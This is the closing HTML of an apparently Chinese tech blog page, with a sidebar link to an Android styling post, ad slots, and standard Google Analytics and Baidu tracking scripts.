      <li><a class="post-link" href="/2019/05/12/zzzfffei_90136638.html">Android之实现选中时改变样式</a></li>
    
  </ul>
</div>

<div class="col-box post-toc hide">
  <div class="col-box-title">目录</div>
</div>

<div class="col-box">
  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <!-- right_sidebar -->
  <ins class="adsbygoogle"
       style="display:block"
       data-ad-client="ca-pub-8889449066804352"
       data-ad-slot="2081363239"
       data-ad-format="auto"
       data-full-width-responsive="true"></ins>
  <script>
    (adsbygoogle = window.adsbygoogle || []).push({});
  </script>
</div>


        </div>
      </div>
    </div>

    <footer class="footer">
<div class="wrapper">
&copy; 2019 
</div>
</footer>

<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
<script src="/js/easybook.js"></script>

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-123344652-5"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-123344652-5');
</script>


<script data-ad-client="ca-pub-8889449066804352" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>

<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.async = true;
  hm.src = "https://hm.baidu.com/hm.js?9b378145d7399199b371d067f4c8be96";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>




  </body>

</html>
